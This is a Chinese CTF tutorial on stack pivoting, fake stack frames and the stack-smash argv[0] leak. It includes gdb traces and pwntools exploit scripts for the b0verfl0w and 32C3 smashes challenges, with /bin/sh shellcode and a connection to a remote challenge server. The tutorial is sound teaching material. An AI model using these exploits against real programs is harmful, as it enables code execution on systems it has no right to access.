#  花式栈溢出技巧

## stack privot

### 原理

stack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot

- 可以控制的栈溢出的字节数较少，难以构造较长的ROP链
- 开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。
- 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而利用堆漏洞

此外，利用stack privot有以下几个要求

- 可以控制程序执行流。

- 可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是

```asm
pop rsp/esp
```

  当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。

```asm
gef➤  x/7i 0x000000000040061a
0x40061a <__libc_csu_init+90>:	pop    rbx
0x40061b <__libc_csu_init+91>:	pop    rbp
0x40061c <__libc_csu_init+92>:	pop    r12
0x40061e <__libc_csu_init+94>:	pop    r13
0x400620 <__libc_csu_init+96>:	pop    r14
0x400622 <__libc_csu_init+98>:	pop    r15
0x400624 <__libc_csu_init+100>:	ret    
gef➤  x/7i 0x000000000040061d
0x40061d <__libc_csu_init+93>:	pop    rsp
0x40061e <__libc_csu_init+94>:	pop    r13
0x400620 <__libc_csu_init+96>:	pop    r14
0x400622 <__libc_csu_init+98>:	pop    r15
0x400624 <__libc_csu_init+100>:	ret
```

  此外，还有更加高级的fake frame。


- 存在可以控制内容的内存，一般有如下
  - bss段。由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限。
  - heap。但是这个需要我们能够泄露堆地址。

### 示例

#### 例1

这里我们以**X-CTF Quals 2016 - b0verfl0w**为例，进行介绍。首先，查看程序的安全保护，如下

```shell
➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w                 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

可以看出源程序为32位，也没有开启NX保护，下面我们来找一下程序的漏洞

```C
signed int vul()
{
  char s; // [sp+18h] [bp-20h]@1

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin);
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}
```

可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode并执行。基本利用思路如下

- 利用栈溢出布置shellcode
- 控制eip指向shellcode处

第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。

```shell
➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         
Gadgets information
============================================================
0x08048504 : jmp esp
0x0804836a : ret
0x0804847e : ret 0xeac1

Unique gadgets found: 3
```

这里我们发现有一个可以直接跳转到esp的gadgets。那么我们可以布置payload如下

```text
shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
```

那么我们payload中的最后一部分改如何设置esp呢，可以知道

- size(shellcode+padding)=0x20
- size(fake ebp)=0x4
- size(0x08048504)=0x4

所以我们最后一段需要执行的指令就是

```asm
sub 0x28,esp
jmp esp
```

所以最后的exp如下

```python
from pwn import *
sh = process('./b0verfl0w')

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
jmp_esp = 0x08048504
payload = shellcode_x86 + (
    0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
sh.sendline(payload)
sh.interactive()
```

#### 例2-转移堆

待。

### 题目

- EkoPartyCTF 2016 fuckzing-exploit-200

## frame faking

正如这个技巧名字所说的那样，这个技巧就是构造一个虚假的栈帧来控制程序的执行流。

### 原理

概括地讲，我们在之前讲的栈溢出不外乎两种方式

- 控制程序EIP
- 控制程序EBP

其最终都是控制程序的执行流。在frame faking中，我们所利用的技巧便是同时控制EBP与EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其payload如下

```
buffer padding|fake ebp|leave ret addr|
```

即我们利用栈溢出将栈上构造为如上格式。这里我们主要接下后面两个部分

- 函数的返回地址被我们覆盖为执行leave ret的地址，这就表明了函数在正常执行完自己的leave ret后，还会再次执行一次leave ret。
- 其中fake ebp为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下

```
fake ebp
|
v
ebp2|target function addr|leave ret addr|arg1|arg2
```

这里我们的fake ebp指向ebp2，即它为ebp2所在的地址。通常来说，这里都是我们能够控制的可读的内容。

**下面的汇编语法是 AT&T 语法。**

在我们介绍基本的控制过程之前，我们还是有必要说一下，函数的入口点与出口点的基本操作

入口点

```
push ebp  # 将ebp压栈
move esp, ebp #将esp的值赋给ebp
```

出口点

```
leave
ret #pop eip，弹出栈顶元素作为程序下一个执行地址
```

其中leave指令相当于

```
move ebp, esp # 将ebp的值赋给esp
pop ebp #弹出ebp
```

下面我们来仔细说一下基本的控制过程。

1. 在有栈溢出的程序执行leave时，其分为两个步骤

   - move ebp, esp ，这会将esp也指向当前栈溢出漏洞的ebp基地址处。
   - pop ebp， 这会将栈中存放的fake ebp的值赋给ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了ebp2所在的地址。

2. 执行ret指令，会再次执行leave ret指令。

3. 执行leave指令，其分为两个步骤

   - move ebp, esp ，这会将esp指向ebp2。
   - pop ebp，此时，会将ebp的内容设置为ebp2的值，同时esp会指向target function。

4. 执行ret指令，这时候程序就会执行targetfunction，当其进行程序的时候会执行

   - push ebp,会将ebp2值压入栈中，

   - move esp, ebp，将ebp指向当前基地址。

此时的栈结构如下

```
ebp
|
v
ebp2|leave ret addr|arg1|arg2
```

5. 当程序执行师，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。

6. 程序结束后，其又会执行两次 leave ret addr，所以如果我们在ebp2处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。

可以看出在fake frame中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与stack privot相似。

### 例子

目前来说，我在exploit-exercise的fusion level2中利用过这个技巧，其它地方暂时还未遇到，遇到的时候再进行补充。

### 题目



参考阅读

- [http://www.xfocus.net/articles/200602/851.html](http://www.xfocus.net/articles/200602/851.html)
- [http://phrack.org/issues/58/4.html](http://phrack.org/issues/58/4.html)


## Stack smash

### 原理

在程序加了canary保护之后，如果我们读取的buffer覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而stack smash技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序发现canary保护之后，如果发现canary被修改的话，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下

```C
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

所以说如果我们利用栈溢出覆盖argv[0]为我们想要输出的字符串的地址，那么在__fortify_fail函数中就会输出我们想要的信息。

### 例子

这里，我们以2015年32C3 CTF smashes为例进行介绍，该题目在jarvisoj上有复现。

#### 确定保护

可以看出程序为64位，主要开启了Canary保护以及NX保护，以及FORTIFY保护。

```shell
➜  stacksmashes git:(master) ✗ checksec smashes
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

#### 分析程序

ida看一下

```c
__int64 sub_4007E0()
{
  __int64 v0; // rax@1
  __int64 v1; // rbx@2
  int v2; // eax@3
  __int64 v4; // [sp+0h] [bp-128h]@1
  __int64 v5; // [sp+108h] [bp-20h]@1

  v5 = *MK_FP(__FS__, 40LL);
  __printf_chk(1LL, (__int64)"Hello!\nWhat's your name? ");
  LODWORD(v0) = _IO_gets((__int64)&v4);
  if ( !v0 )
LABEL_9:
    _exit(1);
  v1 = 0LL;
  __printf_chk(1LL, (__int64)"Nice to meet you, %s.\nPlease overwrite the flag: ");
  while ( 1 )
  {
    v2 = _IO_getc(stdin);
    if ( v2 == -1 )
      goto LABEL_9;
    if ( v2 == '\n' )
      break;
    byte_600D20[v1++] = v2;
    if ( v1 == ' ' )
      goto LABEL_8;
  }
  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
LABEL_8:
  puts("Thank you, bye!");
  return *MK_FP(__FS__, 40LL) ^ v5;
}
```

很显然，程序在_IO_gets((__int64)&v4);存在栈溢出。

此外，程序中还提示要overwrite flag。而且发现程序很有意思的在while循环之后执行了这条语句

```C
  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
```

又看了看对应地址的内容，可以发现如下内容，说明程序的flag就在这里啊。


```
.data:0000000000600D20 ; char aPctfHereSTheFl[]
.data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0
```

但是如果我们直接利用栈溢出输出该地址的内容是不可行的，这是因为我们读入的内容` byte_600D20[v1++] = v2;`也恰恰就是该块内存，这会直接将其覆盖掉，这时候我们就需要利用一个技巧了

- 在EFL内存映射时，bss段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用gdb的find来进行查找。

#### 确定flag地址

我们把断点下载memset函数处，然后读取相应的内容如下

```asm
gef➤  c
Continuing.
Hello!
What's your name? qqqqqqq
Nice to meet you, qqqqqqq.
Please overwrite the flag: 222222222

Breakpoint 1, __memset_avx2 () at ../sysdeps/x86_64/multiarch/memset-avx2.S:38
38	../sysdeps/x86_64/multiarch/memset-avx2.S: 没有那个文件或目录.
─────────────────────────────────────[ code:i386:x86-64 ]────
   0x7ffff7b7f920 <__memset_chk_avx2+0> cmp    rcx, rdx
   0x7ffff7b7f923 <__memset_chk_avx2+3> jb     0x7ffff7b24110 <__GI___chk_fail>
   0x7ffff7b7f929                  nop    DWORD PTR [rax+0x0]
 → 0x7ffff7b7f930 <__memset_avx2+0> vpxor  xmm0, xmm0, xmm0
   0x7ffff7b7f934 <__memset_avx2+4> vmovd  xmm1, esi
   0x7ffff7b7f938 <__memset_avx2+8> lea    rsi, [rdi+rdx*1]
   0x7ffff7b7f93c <__memset_avx2+12> mov    rax, rdi
───────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffda38', 'l8']
8
0x00007fffffffda38│+0x00: 0x0000000000400878  →   mov edi, 0x40094e	 ← $rsp
0x00007fffffffda40│+0x08: 0x0071717171717171 ("qqqqqqq"?)
0x00007fffffffda48│+0x10: 0x0000000000000000
0x00007fffffffda50│+0x18: 0x0000000000000000
0x00007fffffffda58│+0x20: 0x0000000000000000
0x00007fffffffda60│+0x28: 0x0000000000000000
0x00007fffffffda68│+0x30: 0x0000000000000000
0x00007fffffffda70│+0x38: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7b7f930 → Name: __memset_avx2()
[#1] 0x400878 → mov edi, 0x40094e
──────────────────────────────────────────────────────────────────────────────
gef➤  find 22222
Argument required (expression to compute).
gef➤  find '22222'
No symbol "22222" in current context.
gef➤  grep '22222'
[+] Searching '22222' in memory
[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x600000-0x601000), permission=rw-
  0x600d20 - 0x600d3f  →   "222222222's the flag on server}" 
[+] In '[heap]'(0x601000-0x622000), permission=rw-
  0x601010 - 0x601019  →   "222222222" 
gef➤  grep PCTF
[+] Searching 'PCTF' in memory
[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x400000-0x401000), permission=r-x
  0x400d20 - 0x400d3f  →   "PCTF{Here's the flag on server}" 
```

可以看出我们读入的2222已经覆盖了0x600d20处的flag，但是我们在内存的0x400d20处仍然找到了这个flag的备份，所以我们还是可以将其输出。这里我们已经确定了flag的地址。

#### 确定偏移

下面，我们确定argv[0]距离读取的字符串的偏移。

首先下断点在main函数入口处，如下

```asm
gef➤  b *0x00000000004006D0
Breakpoint 1 at 0x4006d0
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes 

Breakpoint 1, 0x00000000004006d0 in ?? ()
 code:i386:x86-64 ]────
     0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
     0x4006c6 <_IO_gets@plt+6> push   0x9
     0x4006cb <_IO_gets@plt+11> jmp    0x400620
 →   0x4006d0                  sub    rsp, 0x8
     0x4006d4                  mov    rdi, QWORD PTR [rip+0x200665]        # 0x600d40 <stdout>
     0x4006db                  xor    esi, esi
     0x4006dd                  call   0x400660 <setbuf@plt>
──────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb78', 'l8']
8
0x00007fffffffdb78│+0x00: 0x00007ffff7a2d830  →  <__libc_start_main+240> mov edi, eax	 ← $rsp
0x00007fffffffdb80│+0x08: 0x0000000000000000
0x00007fffffffdb88│+0x10: 0x00007fffffffdc58  →  0x00007fffffffe00b  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]"
0x00007fffffffdb90│+0x18: 0x0000000100000000
0x00007fffffffdb98│+0x20: 0x00000000004006d0  →   sub rsp, 0x8
0x00007fffffffdba0│+0x28: 0x0000000000000000
0x00007fffffffdba8│+0x30: 0x48c916d3cf726fe3
0x00007fffffffdbb0│+0x38: 0x00000000004006ee  →   xor ebp, ebp
──────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x4006d0 → sub rsp, 0x8
[#1] 0x7ffff7a2d830 → Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48)
---Type <return> to continue, or q <return> to quit---
[#2] 0x400717 → hlt 

```

可以看出0x00007fffffffe00b指向程序名，其自然就是argv[0]，所以我们修改的内容就是这个地址。同时0x00007fffffffdc58处保留着该地址，所以我们真正需要的地址是0x00007fffffffdc58。

此外，根据汇编代码

```asm
.text:00000000004007E0                 push    rbp
.text:00000000004007E1                 mov     esi, offset aHelloWhatSYour ; "Hello!\nWhat's your name? "
.text:00000000004007E6                 mov     edi, 1
.text:00000000004007EB                 push    rbx
.text:00000000004007EC                 sub     rsp, 118h
.text:00000000004007F3                 mov     rax, fs:28h
.text:00000000004007FC                 mov     [rsp+128h+var_20], rax
.text:0000000000400804                 xor     eax, eax
.text:0000000000400806                 call    ___printf_chk
.text:000000000040080B                 mov     rdi, rsp
.text:000000000040080E                 call    __IO_gets
```

我们可以确定我们读入的字符串的起始地址其实就是调用__IO_gets之前的rsp，所以我们把断点下在call处，如下

```asm
gef➤  b *0x000000000040080E
Breakpoint 2 at 0x40080e
gef➤  c
Continuing.
Hello!
What's your name? 
Breakpoint 2, 0x000000000040080e in ?? ()
──────────────────────────[ code:i386:x86-64 ]────
     0x400804                  xor    eax, eax
     0x400806                  call   0x4006b0 <__printf_chk@plt>
     0x40080b                  mov    rdi, rsp
 →   0x40080e                  call   0x4006c0 <_IO_gets@plt>
   ↳    0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
        0x4006c6 <_IO_gets@plt+6> push   0x9
        0x4006cb <_IO_gets@plt+11> jmp    0x400620
        0x4006d0                  sub    rsp, 0x8
──────────────────[ stack ]────
['0x7fffffffda40', 'l8']
8
0x00007fffffffda40│+0x00: 0x0000ff0000000000	 ← $rsp, $rdi
0x00007fffffffda48│+0x08: 0x0000000000000000
0x00007fffffffda50│+0x10: 0x0000000000000000
0x00007fffffffda58│+0x18: 0x0000000000000000
0x00007fffffffda60│+0x20: 0x0000000000000000
0x00007fffffffda68│+0x28: 0x0000000000000000
0x00007fffffffda70│+0x30: 0x0000000000000000
0x00007fffffffda78│+0x38: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x40080e → call 0x4006c0 <_IO_gets@plt>
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  print $rsp
$1 = (void *) 0x7fffffffda40
```

可以看出rsp的值为0x7fffffffda40，那么相对偏移为

```python
>>> 0x00007fffffffdc58-0x7fffffffda40
536
>>> hex(536)
'0x218'
```

#### 利用程序

我们构造利用程序如下

```python
from pwn import *
context.log_level = 'debug'
smash = ELF('./smashes')
if args['REMOTE']:
    sh = remote('pwn.jarvisoj.com', 9877)
else:
    sh = process('./smashes')
argv_addr = 0x00007fffffffdc58
name_addr = 0x7fffffffda40
flag_addr = 0x600D20
another_flag_addr = 0x400d20
payload = 'a' * (argv_addr - name_addr) + p64(another_flag_addr)
sh.recvuntil('name? ')
sh.sendline(payload)
sh.recvuntil('flag: ')
sh.sendline('bb')
data = sh.recv()
sh.interactive()
```

这里我们直接就得到了flag，没有出现网上说的得不到flag的情况。

### 题目

